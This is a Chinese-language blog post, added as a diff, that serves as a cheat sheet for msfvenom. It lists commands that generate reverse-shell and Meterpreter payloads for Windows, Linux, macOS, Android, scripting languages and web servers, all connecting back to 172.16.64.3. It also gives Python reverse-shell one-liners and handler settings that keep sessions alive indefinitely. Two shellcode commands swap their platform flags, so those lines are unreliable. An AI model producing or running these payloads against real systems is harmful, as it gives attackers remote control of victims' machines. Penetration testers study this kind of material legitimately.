@@ -1,0 +1,133 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="知识的搬运工"><title>msfvenom使用笔记 | dnsl0g's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.4.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">msfvenom使用笔记</h1><a id="logo" href="/.">dnsl0g's Blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">msfvenom使用笔记</h1><div class="post-meta">2020-12-30<span> | </span><span class="category"><a href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></span></div><div class="post-content"><p>msfvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自 2015年6月8日起，msfvenom替换了msfpayload和msfencode。</p>
+<span id="more"></span>
+<h3 id="1-msfvenom参数"><a href="#1-msfvenom参数" class="headerlink" title="1. msfvenom参数"></a>1. msfvenom参数</h3><p>查看帮助参数的命令<code>msfvenom -h</code></p>
+<p><img src="http://qiniuyun.zzqsmile.top/xzz/iAufrG.jpg" alt="iAufrG"></p>
+<p>中文解释：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Options:    </span><br><span class="line">-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;#039;-&amp;#039;或者stdin指定     </span><br><span class="line">-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all     </span><br><span class="line">-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度     </span><br><span class="line">-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)     </span><br><span class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）     </span><br><span class="line">-a, --arch       &lt;architecture&gt;  指定payload的目标架构，这里x86是32位，x64是64位      </span><br><span class="line">-platform       &lt;platform&gt;      指定payload的目标平台     </span><br><span class="line">-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度     </span><br><span class="line">-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;     </span><br><span class="line">-i, --iterations &lt;count&gt;         指定payload的编码次数     </span><br><span class="line">-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件     </span><br><span class="line">-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板     </span><br><span class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行         </span><br><span class="line">--payload-options                列举payload的标准选项     </span><br><span class="line">-o, --out        &lt;path&gt;          保存payload     </span><br><span class="line">-v, --var-name   &lt;name&gt;          指定一个自定义的变量，以确定输出格式         </span><br><span class="line">--shellest                       最小化生成payload     </span><br><span class="line">-h, --help                       查看帮助选项         </span><br><span class="line">--help-formats                   查看msf支持的输出格式列表</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>如果想查看<code>linux/x64/meterpreter/reverse_tcp</code>支持什么平台和选项，可以用命令<code>msfvenom -p linux/x64/meterpreter/reverse_tcp --list-options</code>来进行查看</p>
+</li>
+<li><p>使用<code>msfvenom --list payload</code>可以查看所有可以使用的<code>payload</code></p>
+</li>
+<li><p>使用<code>msfvenom --list encoders</code>可以查看所有编码器，<code>excellent</code>表示评价等级最高</p>
+</li>
+</ul>
+<h3 id="2-重要监听参数小技巧"><a href="#2-重要监听参数小技巧" class="headerlink" title="2. 重要监听参数小技巧"></a>2. 重要监听参数小技巧</h3><ul>
+<li><strong>防止假session</strong><br>在实际渗透过程中，我们可能会遇到假session或者刚连接就断开的情况，如下参数可以防止这种情况的发生,可在接受到seesion后继续监听端口，持续侦听。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set ExitOnSession false</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>防止session意外退出</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set SessionCommunicationTimeout 0 &#x2F;&#x2F;默认情况下，如果一个会话将在5分钟没有任何活动，那么就会被杀死，防止这种情况可将此项设置为0</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set SessionExpirationTimeout 0  &#x2F;&#x2F;默认情况下，一个星期后，会话将被强制关闭，修改它为0可永久不关闭</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>handler后台持续监听</strong></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;handler) &gt; exploit -j -z</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>exploit -j -z</code>可在后台持续坚挺，<code>-j</code>为后台任务，<code>-z</code>为持续监听，使用<code>jobs</code>命令查看和管理后台任务。<code>jobs -K</code>命令结束所有命令。</p>
+<h3 id="3-各个平台payload生成"><a href="#3-各个平台payload生成" class="headerlink" title="3. 各个平台payload生成"></a>3. 各个平台payload生成</h3><h4 id="3-1-二进制"><a href="#3-1-二进制" class="headerlink" title="3.1 二进制"></a>3.1 二进制</h4><ul>
+<li>windows</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;4444 -a x86 --platform Windows -f exe &gt; win32.exe</span><br><span class="line"></span><br><span class="line"># msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f exe &gt; win64.exe</span><br></pre></td></tr></table></figure>
+
+<p>windows下生成32位/64位payload时需要记得一点的是，<code>windows/meterpreter/reverse_tcp</code>默认是32位的，同样可以使用<code>-a x86</code>选项指定。要是64位则payload为<code>windows/x64/meterpreter/reverse_tcp</code></p>
+<ul>
+<li>linux</li>
+</ul>
+<p>linux平台,直接赋予执行权限，执行即可触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f elf &gt; linux.elf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Mac</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -a x86 --platform osx -f macho &gt; mac.macho</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Android</li>
+</ul>
+<p>android平台，这里生成的apk不能直接被装到手机上手机上，需要给apk签名后才能装，装完后点击dakai即可触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a dalvik -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f raw &gt; shell.apk</span><br><span class="line"></span><br><span class="line">msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 R &gt; test.apk</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Powershell</li>
+</ul>
+<p>把文件编码后的powershell payload代码直接取出，丢到目标机器的cmd中执行触发，就会弹回一个poweshell的shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;powershell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -e cmd&#x2F;powershell_base64 -i 3 -f raw -o shell.ps1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Netcat</li>
+</ul>
+<p>nc正向连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_hidden_bind_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure>
+
+<p>nc反向连接，监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333  -f exe&gt; 1.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2-Shellcode"><a href="#3-2-Shellcode" class="headerlink" title="3.2 Shellcode"></a>3.2 Shellcode</h4><ul>
+<li>基于Linux的Shellcode</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -a x86 --platform Windows -f c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>基于Windows的Shellcode</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -a x86 --platform Linux -f c</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>基于Mac的Shellcode</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -a x86 --platform osx -f c</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="3-3-脚本"><a href="#3-3-脚本" class="headerlink" title="3.3 脚本"></a>3.3 脚本</h4><ul>
+<li>Python反弹shell</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_python LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">msfvenom -a python -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Python正向shell</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python&#x2F;python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.64.3&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line"></span><br><span class="line">python&#x2F;python3 -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&quot;172.16.64.3&quot;,3333))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Bash</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_bash LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Perl</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Lua</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd&#x2F;unix&#x2F;reverse_lua LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -f raw -o shell.lua</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Ruby</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p ruby&#x2F;shell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;3333 -f raw -o shell.rb</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-4-Web"><a href="#3-4-Web" class="headerlink" title="3.4 Web"></a>3.4 Web</h4><ul>
+<li>PHP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure></li>
+<li>ASPX<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f aspx -o shell.aspx</span><br></pre></td></tr></table></figure></li>
+<li>ASP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure></li>
+<li>JSP<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure></li>
+<li>WAR<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f war &gt; shell.war</span><br></pre></td></tr></table></figure></li>
+<li>nodejs<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p nodejs&#x2F;shell_reverse_tcp LHOST&#x3D;172.16.64.3 LPORT&#x3D;5555 -f raw -o shell.js</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h3 id="4-Handlers"><a href="#4-Handlers" class="headerlink" title="4. Handlers"></a>4. Handlers</h3><p>创建好监听器,等待shell回连,务必注意,创建什么类型的payload就要用什么类型的监听器来接收,需要一一对应。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set PAYLOAD &lt;Payload name&gt;</span><br><span class="line">set LHOST 172.16.64.3</span><br><span class="line">set LPORT 3333</span><br><span class="line">set ExitOnSession false</span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w">https://mp.weixin.qq.com/s/1r0iakLpnLrjCrOp2gT10w</a></li>
+</ul>
+</div><div class="tags"><a href="/tags/msfvenom/"><i class="fa fa-tag"></i>msfvenom</a></div><div class="post-nav"><a class="pre" href="/2021/01/12/%E5%BF%AB%E7%94%A8%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">SQL注入笔记</a><a class="next" href="/2020/12/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">内网信息收集二</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://dnsl0g.github.io"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/poc-exp/">poc_exp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BF%AB%E7%94%A8%E7%AC%94%E8%AE%B0/">快用笔记</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/weblogic/" style="font-size: 15px;">weblogic</a> <a href="/tags/msfvenom/" style="font-size: 15px;">msfvenom</a> <a href="/tags/MSSQL/" style="font-size: 15px;">MSSQL</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/01/26/%E5%BF%AB%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%AA%83%E5%8F%96MSSQL%E5%90%84%E7%89%88%E6%9C%AC%E5%AF%86%E7%A0%81HASH/">窃取MSSQL各版本密码HASH</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/01/12/%E5%BF%AB%E7%94%A8%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/">SQL注入笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/msfvenom%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">msfvenom使用笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">内网信息收集二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/24/poc_exp/cve-2020-14882/">weblogic cve-2020-14882</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/mimikatz%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">mimikatz基本使用教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/12/15/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">内网信息收集一</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://www.example1.com/" title="site-name1" target="_blank">site-name1</a><ul></ul><a href="http://www.example2.com/" title="site-name2" target="_blank">site-name2</a><ul></ul><a href="http://www.example3.com/" title="site-name3" target="_blank">site-name3</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2021 <a href="/." rel="nofollow">dnsl0g's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox/dist/jquery.fancybox.min.css"><script type="text/javascript" src="/js/copycode.js" successtext="复制成功!"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>
